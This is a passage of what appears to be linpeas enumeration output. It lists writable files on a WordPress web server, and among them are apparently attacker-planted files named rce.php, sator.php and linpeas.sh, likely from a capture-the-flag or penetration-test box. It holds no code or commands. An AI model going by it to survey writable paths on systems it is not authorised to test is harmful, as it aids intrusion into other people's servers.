/var/lib/lxcfs/cgroup/memory/system.slice/systemd-udevd.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/uuidd.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/vgauth.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/user.slice/cgroup.event_control
/var/lib/php/sessions
/var/tmp
/var/www/html
/var/www/html/index.html
/var/www/html/linpeas.sh
/var/www/html/rce.php
/var/www/html/sator.php
/var/www/html/sator.php.bak
#)You_can_write_even_more_files_inside_last_directory
/var/www/html/wordpress/index.php
/var/www/html/wordpress/license.txt
/var/www/html/wordpress/readme.html
/var/www/html/wordpress/wp-activate.php
/var/www/html/wordpress/wp-admin
/var/www/html/wordpress/wp-admin/about.php
/var/www/html/wordpress/wp-admin/admin-ajax.php
/var/www/html/wordpress/wp-admin/admin-footer.php
/var/www/html/wordpress/wp-admin/admin-functions.php
/var/www/html/wordpress/wp-admin/admin-header.php
#)You_can_write_even_more_files_inside_last_directory
/var/www/html/wordpress/wp-admin/css/about-rtl.css
/var/www/html/wordpress/wp-admin/css/about-rtl.min.css
/var/www/html/wordpress/wp-admin/css/about.css
/var/www/html/wordpress/wp-admin/css/about.min.css
/var/www/html/wordpress/wp-admin/css/admin-menu-rtl.css
#)You_can_write_even_more_files_inside_last_directory
/var/www/html/wordpress/wp-admin/css/colors/_admin.scss
/var/www/html/wordpress/wp-admin/css/colors/_mixins.scss
/var/www/html/wordpress/wp-admin/css/colors/_variables.scss
/var/www/html/wordpress/wp-admin/css/colors/blue
/var/www/html/wordpress/wp-admin/css/colors/blue/colors-rtl.css
/var/www/html/wordpress/wp-admin/css/colors/blue/colors-rtl.min.css
/var/www/html/wordpress/wp-admin/css/colors/blue/colors.css
/var/www/html/wordpress/wp-admin/css/colors/blue/colors.min.css
/var/www/html/wordpress/wp-admin/css/colors/blue/colors.scss
/var/www/html/wordpress/wp-admin/css/colors/coffee
/var/www/html/wordpress/wp-admin/css/colors/coffee/colors-rtl.css
/var/www/html/wordpress/wp-admin/css/colors/coffee/colors-rtl.min.css
/var/www/html/wordpress/wp-admin/css/colors/coffee/colors.css
/var/www/html/wordpress/wp-admin/css/colors/coffee/colors.min.css
/var/www/html/wordpress/wp-admin/css/colors/coffee/colors.scss
/var/www/html/wordpress/wp-admin/css/colors/ectoplasm
/var/www/html/wordpress/wp-admin/css/colors/ectoplasm/colors-rtl.css
/var/www/html/wordpress/wp-admin/css/colors/ectoplasm/colors-rtl.min.css
/var/www/html/wordpress/wp-admin/css/colors/ectoplasm/colors.css
/var/www/html/wordpress/wp-admin/css/colors/ectoplasm/colors.min.css
/var/www/html/wordpress/wp-admin/css/colors/ectoplasm/colors.scss
/var/www/html/wordpress/wp-admin/css/colors/light
/var/www/html/wordpress/wp-admin/css/colors/light/colors-rtl.css
/var/www/html/wordpress/wp-admin/css/colors/light/colors-rtl.min.css
/var/www/html/wordpress/wp-admin/css/colors/light/colors.css
/var/www/html/wordpress/wp-admin/css/colors/light/colors.min.css
/var/www/html/wordpress/wp-admin/css/colors/light/colors.scss
/var/www/html/wordpress/wp-admin/css/colors/midnight
/var/www/html/wordpress/wp-admin/css/colors/midnight/colors-rtl.css
/var/www/html/wordpress/wp-admin/css/colors/midnight/colors-rtl.min.css
/var/www/html/wordpress/wp-admin/css/colors/midnight/colors.css
/var/www/html/wordpress/wp-admin/css/colors/midnight/colors.min.css
/var/www/html/wordpress/wp-admin/css/colors/midnight/colors.scss
/var/www/html/wordpress/wp-admin/css/colors/modern
/var/www/html/wordpress/wp-admin/css/colors/modern/colors-rtl.css
/var/www/html/wordpress/wp-admin/css/colors/modern/colors-rtl.min.css
/var/www/html/wordpress/wp-admin/css/colors/modern/colors.css
/var/www/html/wordpress/wp-admin/css/colors/modern/colors.min.css
/var/www/html/wordpress/wp-admin/css/colors/modern/colors.scss
/var/www/html/wordpress/wp-admin/css/colors/ocean
/var/www/html/wordpress/wp-admin/css/colors/ocean/colors-rtl.css
/var/www/html/wordpress/wp-admin/css/colors/ocean/colors-rtl.min.css
/var/www/html/wordpress/wp-admin/css/colors/ocean/colors.css
/var/www/html/wordpress/wp-admin/css/colors/ocean/colors.min.css
/var/www/html/wordpress/wp-admin/css/colors/ocean/colors.scss
/var/www/html/wordpress/wp-admin/css/colors/sunrise
/var/www/html/wordpress/wp-admin/css/colors/sunrise/colors-rtl.css
/var/www/html/wordpress/wp-admin/css/colors/sunrise/colors-rtl.min.css
/var/www/html/wordpress/wp-admin/css/colors/sunrise/colors.css
/var/www/html/wordpress/wp-admin/css/colors/sunrise/colors.min.css
/var/www/html/wordpress/wp-admin/css/colors/sunrise/colors.scss
/var/www/html/wordpress/wp-admin/css/common-rtl.css
/var/www/html/wordpress/wp-admin/css/common-rtl.min.css
/var/www/html/wordpress/wp-admin/css/common.css
/var/www/html/wordpress/wp-admin/css/common.min.css
/var/www/html/wordpress/wp-admin/css/customize-controls-rtl.css
#)You_can_write_even_more_files_inside_last_directory
/var/www/html/wordpress/wp-admin/custom-background.php
/var/www/html/wordpress/wp-admin/custom-header.php
/var/www/html/wordpress/wp-admin/customize.php
/var/www/html/wordpress/wp-admin/edit-comments.php
/var/www/html/wordpress/wp-admin/edit-form-advanced.php
#)You_can_write_even_more_files_inside_last_directory
/var/www/html/wordpress/wp-admin/includes/admin-filters.php
/var/www/html/wordpress/wp-admin/includes/admin.php
/var/www/html/wordpress/wp-admin/includes/ajax-actions.php
/var/www/html/wordpress/wp-admin/includes/bookmark.php
/var/www/html/wordpress/wp-admin/includes/class-automatic-upgrader-skin.php
#)You_can_write_even_more_files_inside_last_directory
/var/www/html/wordpress/wp-admin/index.php
/var/www/html/wordpress/wp-admin/install-helper.php
/var/www/html/wordpress/wp-admin/install.php
/var/www/html/wordpress/wp-admin/js
/var/www/html/wordpress/wp-admin/js/accordion.js
/var/www/html/wordpress/wp-admin/js/accordion.min.js
/var/www/html/wordpress/wp-admin/js/application-passwords.js
/var/www/html/wordpress/wp-admin/js/application-passwords.min.js
/var/www/html/wordpress/wp-admin/js/auth-app.js
#)You_can_write_even_more_files_inside_last_directory
/var/www/html/wordpress/wp-admin/js/widgets/custom-html-widgets.js
/var/www/html/wordpress/wp-admin/js/widgets/custom-html-widgets.min.js
/var/www/html/wordpress/wp-admin/js/widgets/media-audio-widget.js
/var/www/html/wordpress/wp-admin/js/widgets/media-audio-widget.min.js
/var/www/html/wordpress/wp-admin/js/widgets/media-gallery-widget.js
#)You_can_write_even_more_files_inside_last_directory
/var/www/html/wordpress/wp-admin/js/word-count.js
/var/www/html/wordpress/wp-admin/js/word-count.min.js
/var/www/html/wordpress/wp-admin/js/xfn.js
/var/www/html/wordpress/wp-admin/js/xfn.min.js
/var/www/html/wordpress/wp-admin/link-add.php
/var/www/html/wordpress/wp-admin/link-manager.php
/var/www/html/wordpress/wp-admin/link-parse-opml.php
/var/www/html/wordpress/wp-admin/link.php
/var/www/html/wordpress/wp-admin/load-scripts.php
#)You_can_write_even_more_files_inside_last_directory
/var/www/html/wordpress/wp-admin/maint/repair.php
/var/www/html/wordpress/wp-admin/media-new.php
/var/www/html/wordpress/wp-admin/media-upload.php
/var/www/html/wordpress/wp-admin/media.php
/var/www/html/wordpress/wp-admin/menu-header.php
/var/www/html/wordpress/wp-admin/menu.php
#)You_can_write_even_more_files_inside_last_directory
/var/www/html/wordpress/wp-admin/network/about.php
/var/www/html/wordpress/wp-admin/network/admin.php
/var/www/html/wordpress/wp-admin/network/credits.php
/var/www/html/wordpress/wp-admin/network/edit.php
/var/www/html/wordpress/wp-admin/network/freedoms.php
#)You_can_write_even_more_files_inside_last_directory
/var/www/html/wordpress/wp-admin/options-discussion.php
/var/www/html/wordpress/wp-admin/options-general.php
/var/www/html/wordpress/wp-admin/options-head.php
/var/www/html/wordpress/wp-admin/options-media.php
/var/www/html/wordpress/wp-admin/options-permalink.php
#)You_can_write_even_more_files_inside_last_directory
/var/www/html/wordpress/wp-admin/user/about.php
/var/www/html/wordpress/wp-admin/user/admin.php
/var/www/html/wordpress/wp-admin/user/credits.php
/var/www/html/wordpress/wp-admin/user/freedoms.php
/var/www/html/wordpress/wp-admin/user/index.php
#)You_can_write_even_more_files_inside_last_directory
/var/www/html/wordpress/wp-admin/users.php
/var/www/html/wordpress/wp-admin/widgets.php
/var/www/html/wordpress/wp-blog-header.php
/var/www/html/wordpress/wp-comments-post.php
/var/www/html/wordpress/wp-config-sample.php
/var/www/html/wordpress/wp-config.php
/var/www/html/wordpress/wp-content
/var/www/html/wordpress/wp-content/index.php
/var/www/html/wordpress/wp-content/plugins
/var/www/html/wordpress/wp-content/plugins/akismet
/var/www/html/wordpress/wp-content/plugins/akismet/.htaccess
/var/www/html/wordpress/wp-content/plugins/akismet/LICENSE.txt
/var/www/html/wordpress/wp-content/plugins/akismet/_inc
/var/www/html/wordpress/wp-content/plugins/akismet/_inc/akismet.css
/var/www/html/wordpress/wp-content/plugins/akismet/_inc/akismet.js
/var/www/html/wordpress/wp-content/plugins/akismet/_inc/form.js
/var/www/html/wordpress/wp-content/plugins/akismet/_inc/img
/var/www/html/wordpress/wp-content/plugins/akismet/akismet.php
/var/www/html/wordpress/wp-content/plugins/akismet/changelog.txt
/var/www/html/wordpress/wp-content/plugins/akismet/class.akismet-admin.php
/var/www/html/wordpress/wp-content/plugins/akismet/class.akismet-cli.php
/var/www/html/wordpress/wp-content/plugins/akismet/class.akismet-rest-api.php
#)You_can_write_even_more_files_inside_last_directory
/var/www/html/wordpress/wp-content/plugins/akismet/views/activate.php
/var/www/html/wordpress/wp-content/plugins/akismet/views/config.php
/var/www/html/wordpress/wp-content/plugins/akismet/views/connect-jp.php
/var/www/html/wordpress/wp-content/plugins/akismet/views/enter.php
/var/www/html/wordpress/wp-content/plugins/akismet/views/get.php
#)You_can_write_even_more_files_inside_last_directory
/var/www/html/wordpress/wp-content/plugins/akismet/wrapper.php
/var/www/html/wordpress/wp-content/plugins/hello.php
/var/www/html/wordpress/wp-content/plugins/index.php
/var/www/html/wordpress/wp-content/themes
/var/www/html/wordpress/wp-content/themes/index.php
/var/www/html/wordpress/wp-content/themes/twentynineteen
/var/www/html/wordpress/wp-content/themes/twentynineteen/404.php
/var/www/html/wordpress/wp-content/themes/twentynineteen/archive.php
/var/www/html/wordpress/wp-content/themes/twentynineteen/classes
/var/www/html/wordpress/wp-content/themes/twentynineteen/classes/class-twentynineteen-svg-icons.php
/var/www/html/wordpress/wp-content/themes/twentynineteen/classes/class-twentynineteen-walker-comment.php
/var/www/html/wordpress/wp-content/themes/twentynineteen/comments.php
/var/www/html/wordpress/wp-content/themes/twentynineteen/fonts
/var/www/html/wordpress/wp-content/themes/twentynineteen/fonts/NonBreakingSpaceOverride.woff
/var/www/html/wordpress/wp-content/themes/twentynineteen/fonts/NonBreakingSpaceOverride.woff2
/var/www/html/wordpress/wp-content/themes/twentynineteen/footer.php
/var/www/html/wordpress/wp-content/themes/twentynineteen/functions.php
/var/www/html/wordpress/wp-content/themes/twentynineteen/header.php
/var/www/html/wordpress/wp-content/themes/twentynineteen/image.php
/var/www/html/wordpress/wp-content/themes/twentynineteen/inc
/var/www/html/wordpress/wp-content/themes/twentynineteen/inc/back-compat.php
/var/www/html/wordpress/wp-content/themes/twentynineteen/inc/block-patterns.php
/var/www/html/wordpress/wp-content/themes/twentynineteen/inc/color-patterns.php
/var/www/html/wordpress/wp-content/themes/twentynineteen/inc/customizer.php
/var/www/html/wordpress/wp-content/themes/twentynineteen/inc/helper-functions.php
#)You_can_write_even_more_files_inside_last_directory
/var/www/html/wordpress/wp-content/themes/twentynineteen/index.php
/var/www/html/wordpress/wp-content/themes/twentynineteen/js
/var/www/html/wordpress/wp-content/themes/twentynineteen/js/customize-controls.js
/var/www/html/wordpress/wp-content/themes/twentynineteen/js/customize-preview.js
/var/www/html/wordpress/wp-content/themes/twentynineteen/js/priority-menu.js
/var/www/html/wordpress/wp-content/themes/twentynineteen/js/skip-link-focus-fix.js
/var/www/html/wordpress/wp-content/themes/twentynineteen/js/touch-keyboard-navigation.js
/var/www/html/wordpress/wp-content/themes/twentynineteen/package-lock.json
/var/www/html/wordpress/wp-content/themes/twentynineteen/package.json
/var/www/html/wordpress/wp-content/themes/twentynineteen/page.php
/var/www/html/wordpress/wp-content/themes/twentynineteen/postcss.config.js
/var/www/html/wordpress/wp-content/themes/twentynineteen/print.css
#)You_can_write_even_more_files_inside_last_directory
/var/www/html/wordpress/wp-content/themes/twentynineteen/sass/_normalize.scss
/var/www/html/wordpress/wp-content/themes/twentynineteen/sass/blocks
/var/www/html/wordpress/wp-content/themes/twentynineteen/sass/blocks/_blocks.scss
/var/www/html/wordpress/wp-content/themes/twentynineteen/sass/elements
/var/www/html/wordpress/wp-content/themes/twentynineteen/sass/elements/_elements.scss
/var/www/html/wordpress/wp-content/themes/twentynineteen/sass/elements/_lists.scss
/var/www/html/wordpress/wp-content/themes/twentynineteen/sass/elements/_tables.scss
/var/www/html/wordpress/wp-content/themes/twentynineteen/sass/forms
/var/www/html/wordpress/wp-content/themes/twentynineteen/sass/forms/_buttons.scss
/var/www/html/wordpress/wp-content/themes/twentynineteen/sass/forms/_fields.scss
/var/www/html/wordpress/wp-content/themes/twentynineteen/sass/forms/_forms.scss
/var/www/html/wordpress/wp-content/themes/twentynineteen/sass/layout
/var/www/html/wordpress/wp-content/themes/twentynineteen/sass/layout/_layout.scss
/var/www/html/wordpress/wp-content/themes/twentynineteen/sass/media
/var/www/html/wordpress/wp-content/themes/twentynineteen/sass/media/_captions.scss
/var/www/html/wordpress/wp-content/themes/twentynineteen/sass/media/_galleries.scss
/var/www/html/wordpress/wp-content/themes/twentynineteen/sass/media/_media.scss
/var/www/html/wordpress/wp-content/themes/twentynineteen/sass/mixins
/var/www/html/wordpress/wp-content/themes/twentynineteen/sass/mixins/_mixins-master.scss
/var/www/html/wordpress/wp-content/themes/twentynineteen/sass/mixins/_utilities.scss
/var/www/html/wordpress/wp-content/themes/twentynineteen/sass/modules
/var/www/html/wordpress/wp-content/themes/twentynineteen/sass/modules/_accessibility.scss
/var/www/html/wordpress/wp-content/themes/twentynineteen/sass/modules/_alignments.scss
/var/www/html/wordpress/wp-content/themes/twentynineteen/sass/modules/_clearings.scss
/var/www/html/wordpress/wp-content/themes/twentynineteen/sass/navigation
/var/www/html/wordpress/wp-content/themes/twentynineteen/sass/navigation/_links.scss
/var/www/html/wordpress/wp-content/themes/twentynineteen/sass/navigation/_menu-footer-navigation.scss
/var/www/html/wordpress/wp-content/themes/twentynineteen/sass/navigation/_menu-main-navigation.scss
/var/www/html/wordpress/wp-content/themes/twentynineteen/sass/navigation/_menu-social-navigation.scss
/var/www/html/wordpress/wp-content/themes/twentynineteen/sass/navigation/_navigation.scss
#)You_can_write_even_more_files_inside_last_directory
/var/www/html/wordpress/wp-content/themes/twentynineteen/sass/site
/var/www/html/wordpress/wp-content/themes/twentynineteen/sass/site/_site.scss
/var/www/html/wordpress/wp-content/themes/twentynineteen/sass/site/footer
/var/www/html/wordpress/wp-content/themes/twentynineteen/sass/site/footer/_site-footer.scss
/var/www/html/wordpress/wp-content/themes/twentynineteen/sass/site/header
/var/www/html/wordpress/wp-content/themes/twentynineteen/sass/site/header/_site-featured-image.scss
/var/www/html/wordpress/wp-content/themes/twentynineteen/sass/site/header/_site-header.scss
/var/www/html/wordpress/wp-content/themes/twentynineteen/sass/site/primary
/var/www/html/wordpress/wp-content/themes/twentynineteen/sass/site/primary/_archives.scss
/var/www/html/wordpress/wp-content/themes/twentynineteen/sass/site/primary/_comments.scss
/var/www/html/wordpress/wp-content/themes/twentynineteen/sass/site/primary/_posts-and-pages.scss
/var/www/html/wordpress/wp-content/themes/twentynineteen/sass/site/secondary
/var/www/html/wordpress/wp-content/themes/twentynineteen/sass/site/secondary/_widgets.scss
/var/www/html/wordpress/wp-content/themes/twentynineteen/sass/typography
/var/www/html/wordpress/wp-content/themes/twentynineteen/sass/typography/_copy.scss
/var/www/html/wordpress/wp-content/themes/twentynineteen/sass/typography/_headings.scss
/var/www/html/wordpress/wp-content/themes/twentynineteen/sass/typography/_typography.scss
/var/www/html/wordpress/wp-content/themes/twentynineteen/sass/variables-site
/var/www/html/wordpress/wp-content/themes/twentynineteen/sass/variables-site/_colors.scss
/var/www/html/wordpress/wp-content/themes/twentynineteen/sass/variables-site/_columns.scss
/var/www/html/wordpress/wp-content/themes/twentynineteen/sass/variables-site/_fonts.scss
/var/www/html/wordpress/wp-content/themes/twentynineteen/sass/variables-site/_structure.scss
/var/www/html/wordpress/wp-content/themes/twentynineteen/sass/variables-site/_transitions.scss
#)You_can_write_even_more_files_inside_last_directory
/var/www/html/wordpress/wp-content/themes/twentynineteen/search.php
/var/www/html/wordpress/wp-content/themes/twentynineteen/single.php
/var/www/html/wordpress/wp-content/themes/twentynineteen/style-editor-customizer.css
/var/www/html/wordpress/wp-content/themes/twentynineteen/style-editor-customizer.scss
/var/www/html/wordpress/wp-content/themes/twentynineteen/style-editor.css
#)You_can_write_even_more_files_inside_last_directory
/var/www/html/wordpress/wp-content/themes/twentynineteen/template-parts/content
/var/www/html/wordpress/wp-content/themes/twentynineteen/template-parts/content/content-excerpt.php
/var/www/html/wordpress/wp-content/themes/twentynineteen/template-parts/content/content-none.php
/var/www/html/wordpress/wp-content/themes/twentynineteen/template-parts/content/content-page.php
/var/www/html/wordpress/wp-content/themes/twentynineteen/template-parts/content/content-single.php
/var/www/html/wordpress/wp-content/themes/twentynineteen/template-parts/content/content.php
/var/www/html/wordpress/wp-content/themes/twentynineteen/template-parts/footer
/var/www/html/wordpress/wp-content/themes/twentynineteen/template-parts/footer/footer-widgets.php
/var/www/html/wordpress/wp-content/themes/twentynineteen/template-parts/header
/var/www/html/wordpress/wp-content/themes/twentynineteen/template-parts/header/entry-header.php
/var/www/html/wordpress/wp-content/themes/twentynineteen/template-parts/header/site-branding.php
/var/www/html/wordpress/wp-content/themes/twentynineteen/template-parts/post
/var/www/html/wordpress/wp-content/themes/twentynineteen/template-parts/post/author-bio.php
/var/www/html/wordpress/wp-content/themes/twentynineteen/template-parts/post/discussion-meta.php
/var/www/html/wordpress/wp-content/themes/twentytwenty
/var/www/html/wordpress/wp-content/themes/twentytwenty/.stylelintrc.json
/var/www/html/wordpress/wp-content/themes/twentytwenty/404.php
/var/www/html/wordpress/wp-content/themes/twentytwenty/assets
/var/www/html/wordpress/wp-content/themes/twentytwenty/assets/css
/var/www/html/wordpress/wp-content/themes/twentytwenty/assets/css/editor-style-block-rtl.css
/var/www/html/wordpress/wp-content/themes/twentytwenty/assets/css/editor-style-block.css
/var/www/html/wordpress/wp-content/themes/twentytwenty/assets/css/editor-style-classic-rtl.css
/var/www/html/wordpress/wp-content/themes/twentytwenty/assets/css/editor-style-classic.css
/var/www/html/wordpress/wp-content/themes/twentytwenty/assets/fonts
/var/www/html/wordpress/wp-content/themes/twentytwenty/assets/fonts/inter
/var/www/html/wordpress/wp-content/themes/twentytwenty/assets/fonts/inter/Inter-italic-var.woff2
/var/www/html/wordpress/wp-content/themes/twentytwenty/assets/fonts/inter/Inter-upright-var.woff2
/var/www/html/wordpress/wp-content/themes/twentytwenty/assets/images
/var/www/html/wordpress/wp-content/themes/twentytwenty/assets/js
/var/www/html/wordpress/wp-content/themes/twentytwenty/assets/js/color-calculations.js
/var/www/html/wordpress/wp-content/themes/twentytwenty/assets/js/customize-controls.js
/var/www/html/wordpress/wp-content/themes/twentytwenty/assets/js/customize-preview.js
/var/www/html/wordpress/wp-content/themes/twentytwenty/assets/js/customize.js
/var/www/html/wordpress/wp-content/themes/twentytwenty/assets/js/editor-script-block.js
#)You_can_write_even_more_files_inside_last_directory
/var/www/html/wordpress/wp-content/themes/twentytwenty/classes
/var/www/html/wordpress/wp-content/themes/twentytwenty/classes/class-twentytwenty-customize.php
/var/www/html/wordpress/wp-content/themes/twentytwenty/classes/class-twentytwenty-non-latin-languages.php
/var/www/html/wordpress/wp-content/themes/twentytwenty/classes/class-twentytwenty-script-loader.php
/var/www/html/wordpress/wp-content/themes/twentytwenty/classes/class-twentytwenty-separator-control.php
/var/www/html/wordpress/wp-content/themes/twentytwenty/classes/class-twentytwenty-svg-icons.php
#)You_can_write_even_more_files_inside_last_directory
/var/www/html/wordpress/wp-content/themes/twentytwenty/comments.php
/var/www/html/wordpress/wp-content/themes/twentytwenty/footer.php
/var/www/html/wordpress/wp-content/themes/twentytwenty/functions.php
/var/www/html/wordpress/wp-content/themes/twentytwenty/header.php
/var/www/html/wordpress/wp-content/themes/twentytwenty/inc
/var/www/html/wordpress/wp-content/themes/twentytwenty/inc/block-patterns.php
/var/www/html/wordpress/wp-content/themes/twentytwenty/inc/custom-css.php
/var/www/html/wordpress/wp-content/themes/twentytwenty/inc/starter-content.php
/var/www/html/wordpress/wp-content/themes/twentytwenty/inc/svg-icons.php
/var/www/html/wordpress/wp-content/themes/twentytwenty/inc/template-tags.php
/var/www/html/wordpress/wp-content/themes/twentytwenty/index.php
/var/www/html/wordpress/wp-content/themes/twentytwenty/package-lock.json
/var/www/html/wordpress/wp-content/themes/twentytwenty/package.json
/var/www/html/wordpress/wp-content/themes/twentytwenty/print.css
/var/www/html/wordpress/wp-content/themes/twentytwenty/readme.txt
#)You_can_write_even_more_files_inside_last_directory
/var/www/html/wordpress/wp-content/themes/twentytwenty/template-parts/content-cover.php
/var/www/html/wordpress/wp-content/themes/twentytwenty/template-parts/content.php
/var/www/html/wordpress/wp-content/themes/twentytwenty/template-parts/entry-author-bio.php
/var/www/html/wordpress/wp-content/themes/twentytwenty/template-parts/entry-header.php
/var/www/html/wordpress/wp-content/themes/twentytwenty/template-parts/featured-image.php
#)You_can_write_even_more_files_inside_last_directory
/var/www/html/wordpress/wp-content/themes/twentytwenty/templates
/var/www/html/wordpress/wp-content/themes/twentytwenty/templates/template-cover.php
/var/www/html/wordpress/wp-content/themes/twentytwenty/templates/template-full-width.php
/var/www/html/wordpress/wp-content/themes/twentytwentyone
/var/www/html/wordpress/wp-content/themes/twentytwentyone/.stylelintignore
/var/www/html/wordpress/wp-content/themes/twentytwentyone/.stylelintrc-css.json
/var/www/html/wordpress/wp-content/themes/twentytwentyone/.stylelintrc.json
/var/www/html/wordpress/wp-content/themes/twentytwentyone/404.php
/var/www/html/wordpress/wp-content/themes/twentytwentyone/archive.php
#)You_can_write_even_more_files_inside_last_directory
/var/www/html/wordpress/wp-content/themes/twentytwentyone/assets/css
/var/www/html/wordpress/wp-content/themes/twentytwentyone/assets/css/custom-color-overrides.css
/var/www/html/wordpress/wp-content/themes/twentytwentyone/assets/css/ie-editor.css
/var/www/html/wordpress/wp-content/themes/twentytwentyone/assets/css/ie.css
/var/www/html/wordpress/wp-content/themes/twentytwentyone/assets/css/print.css
/var/www/html/wordpress/wp-content/themes/twentytwentyone/assets/css/style-dark-mode-rtl.css
#)You_can_write_even_more_files_inside_last_directory
/var/www/html/wordpress/wp-content/themes/twentytwentyone/assets/images
/var/www/html/wordpress/wp-content/themes/twentytwentyone/assets/js
/var/www/html/wordpress/wp-content/themes/twentytwentyone/assets/js/customize-helpers.js
/var/www/html/wordpress/wp-content/themes/twentytwentyone/assets/js/customize-preview.js
/var/www/html/wordpress/wp-content/themes/twentytwentyone/assets/js/customize.js
/var/www/html/wordpress/wp-content/themes/twentytwentyone/assets/js/dark-mode-toggler.js
/var/www/html/wordpress/wp-content/themes/twentytwentyone/assets/js/editor-dark-mode-support.js
#)You_can_write_even_more_files_inside_last_directory
/var/www/html/wordpress/wp-content/themes/twentytwentyone/assets/sass
/var/www/html/wordpress/wp-content/themes/twentytwentyone/assets/sass/01-settings
/var/www/html/wordpress/wp-content/themes/twentytwentyone/assets/sass/01-settings/file-header.scss
/var/www/html/wordpress/wp-content/themes/twentytwentyone/assets/sass/01-settings/fonts.scss
/var/www/html/wordpress/wp-content/themes/twentytwentyone/assets/sass/01-settings/global.scss
/var/www/html/wordpress/wp-content/themes/twentytwentyone/assets/sass/02-tools
/var/www/html/wordpress/wp-content/themes/twentytwentyone/assets/sass/02-tools/functions.scss
/var/www/html/wordpress/wp-content/themes/twentytwentyone/assets/sass/02-tools/mixins.scss
/var/www/html/wordpress/wp-content/themes/twentytwentyone/assets/sass/03-generic
/var/www/html/wordpress/wp-content/themes/twentytwentyone/assets/sass/03-generic/breakpoints.scss
/var/www/html/wordpress/wp-content/themes/twentytwentyone/assets/sass/03-generic/clearings.scss
/var/www/html/wordpress/wp-content/themes/twentytwentyone/assets/sass/03-generic/normalize.scss
/var/www/html/wordpress/wp-content/themes/twentytwentyone/assets/sass/03-generic/reset.scss
/var/www/html/wordpress/wp-content/themes/twentytwentyone/assets/sass/03-generic/vertical-margins.scss
/var/www/html/wordpress/wp-content/themes/twentytwentyone/assets/sass/04-elements
/var/www/html/wordpress/wp-content/themes/twentytwentyone/assets/sass/04-elements/blockquote.scss
/var/www/html/wordpress/wp-content/themes/twentytwentyone/assets/sass/04-elements/forms-editor.scss
/var/www/html/wordpress/wp-content/themes/twentytwentyone/assets/sass/04-elements/forms.scss
/var/www/html/wordpress/wp-content/themes/twentytwentyone/assets/sass/04-elements/links.scss
/var/www/html/wordpress/wp-content/themes/twentytwentyone/assets/sass/04-elements/media.scss
#)You_can_write_even_more_files_inside_last_directory
/var/www/html/wordpress/wp-content/themes/twentytwentyone/assets/sass/05-blocks
/var/www/html/wordpress/wp-content/themes/twentytwentyone/assets/sass/05-blocks/_config.scss
/var/www/html/wordpress/wp-content/themes/twentytwentyone/assets/sass/05-blocks/audio
/var/www/html/wordpress/wp-content/themes/twentytwentyone/assets/sass/05-blocks/audio/_style.scss
/var/www/html/wordpress/wp-content/themes/twentytwentyone/assets/sass/05-blocks/blocks-editor.scss
/var/www/html/wordpress/wp-content/themes/twentytwentyone/assets/sass/05-blocks/blocks.scss
/var/www/html/wordpress/wp-content/themes/twentytwentyone/assets/sass/05-blocks/button
/var/www/html/wordpress/wp-content/themes/twentytwentyone/assets/sass/05-blocks/button/_editor.scss
/var/www/html/wordpress/wp-content/themes/twentytwentyone/assets/sass/05-blocks/button/_style.scss
/var/www/html/wordpress/wp-content/themes/twentytwentyone/assets/sass/05-blocks/code
/var/www/html/wordpress/wp-content/themes/twentytwentyone/assets/sass/05-blocks/code/_editor.scss
/var/www/html/wordpress/wp-content/themes/twentytwentyone/assets/sass/05-blocks/code/_style.scss
/var/www/html/wordpress/wp-content/themes/twentytwentyone/assets/sass/05-blocks/columns
/var/www/html/wordpress/wp-content/themes/twentytwentyone/assets/sass/05-blocks/columns/_editor.scss
/var/www/html/wordpress/wp-content/themes/twentytwentyone/assets/sass/05-blocks/columns/_style.scss
/var/www/html/wordpress/wp-content/themes/twentytwentyone/assets/sass/05-blocks/cover
/var/www/html/wordpress/wp-content/themes/twentytwentyone/assets/sass/05-blocks/cover/_editor.scss
/var/www/html/wordpress/wp-content/themes/twentytwentyone/assets/sass/05-blocks/cover/_style.scss
/var/www/html/wordpress/wp-content/themes/twentytwentyone/assets/sass/05-blocks/file
/var/www/html/wordpress/wp-content/themes/twentytwentyone/assets/sass/05-blocks/file/_editor.scss
/var/www/html/wordpress/wp-content/themes/twentytwentyone/assets/sass/05-blocks/file/_style.scss
/var/www/html/wordpress/wp-content/themes/twentytwentyone/assets/sass/05-blocks/gallery
/var/www/html/wordpress/wp-content/themes/twentytwentyone/assets/sass/05-blocks/gallery/_editor.scss
/var/www/html/wordpress/wp-content/themes/twentytwentyone/assets/sass/05-blocks/gallery/_style.scss
/var/www/html/wordpress/wp-content/themes/twentytwentyone/assets/sass/05-blocks/group
/var/www/html/wordpress/wp-content/themes/twentytwentyone/assets/sass/05-blocks/group/_editor.scss
/var/www/html/wordpress/wp-content/themes/twentytwentyone/assets/sass/05-blocks/group/_style.scss
/var/www/html/wordpress/wp-content/themes/twentytwentyone/assets/sass/05-blocks/heading
/var/www/html/wordpress/wp-content/themes/twentytwentyone/assets/sass/05-blocks/heading/_editor.scss
/var/www/html/wordpress/wp-content/themes/twentytwentyone/assets/sass/05-blocks/heading/_style.scss
/var/www/html/wordpress/wp-content/themes/twentytwentyone/assets/sass/05-blocks/html
/var/www/html/wordpress/wp-content/themes/twentytwentyone/assets/sass/05-blocks/html/_editor.scss
/var/www/html/wordpress/wp-content/themes/twentytwentyone/assets/sass/05-blocks/image
/var/www/html/wordpress/wp-content/themes/twentytwentyone/assets/sass/05-blocks/image/_editor.scss
/var/www/html/wordpress/wp-content/themes/twentytwentyone/assets/sass/05-blocks/image/_style.scss
/var/www/html/wordpress/wp-content/themes/twentytwentyone/assets/sass/05-blocks/latest-comments
/var/www/html/wordpress/wp-content/themes/twentytwentyone/assets/sass/05-blocks/latest-comments/_editor.scss
/var/www/html/wordpress/wp-content/themes/twentytwentyone/assets/sass/05-blocks/latest-comments/_style.scss
/var/www/html/wordpress/wp-content/themes/twentytwentyone/assets/sass/05-blocks/latest-posts
/var/www/html/wordpress/wp-content/themes/twentytwentyone/assets/sass/05-blocks/latest-posts/_editor.scss
/var/www/html/wordpress/wp-content/themes/twentytwentyone/assets/sass/05-blocks/latest-posts/_style.scss
/var/www/html/wordpress/wp-content/themes/twentytwentyone/assets/sass/05-blocks/legacy
/var/www/html/wordpress/wp-content/themes/twentytwentyone/assets/sass/05-blocks/legacy/_editor.scss
/var/www/html/wordpress/wp-content/themes/twentytwentyone/assets/sass/05-blocks/legacy/_style.scss
/var/www/html/wordpress/wp-content/themes/twentytwentyone/assets/sass/05-blocks/list
/var/www/html/wordpress/wp-content/themes/twentytwentyone/assets/sass/05-blocks/list/_editor.scss
/var/www/html/wordpress/wp-content/themes/twentytwentyone/assets/sass/05-blocks/list/_style.scss
